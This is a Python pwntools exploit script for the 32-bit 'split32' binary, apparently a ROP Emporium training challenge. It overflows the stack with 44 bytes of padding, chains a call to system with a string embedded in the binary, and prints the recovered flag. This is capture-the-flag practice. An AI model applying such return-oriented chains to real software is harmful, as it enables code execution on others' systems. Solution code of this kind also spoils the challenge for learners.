#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template split32
from pwn import *
exe = context.binary = ELF('split32')
# Set up pwntools for the correct architecture


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
context.clear(arch='i386')
filename = './split32'



io = process(filename)
elf = ELF(filename)

r = ROP(elf)
system_at_plt = 0x0804861a
useFulstring = 0x0804a030

r = ROP(elf)
r.raw(cyclic(44))
r.call(elf.plt['system'],[useFulstring])
r.call('main')

payload = r.chain()


io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))

